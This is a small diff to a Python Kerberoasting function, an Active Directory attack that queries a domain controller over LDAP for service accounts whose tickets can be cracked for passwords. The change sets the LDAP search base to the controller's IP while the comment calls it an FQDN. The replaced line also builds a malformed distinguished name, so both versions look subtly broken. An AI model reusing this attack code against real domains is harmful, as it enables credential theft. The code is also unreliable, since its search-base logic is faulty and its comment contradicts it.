@@ -13,8 +13,8 @@ def kerberoast(username, password, domain, dc_ip):
 
         print(f"Successfully connected to LDAP server {dc_ip}")
 
-        # Use domain name as search base
-        search_base = f"DC={','.join(domain.split('.'))}"
+        # Use FQDN of the domain controller as search base
+        search_base = f"{dc_ip}"
         print(f"Search base: {search_base}")
 
         # Search for users with SPNs set
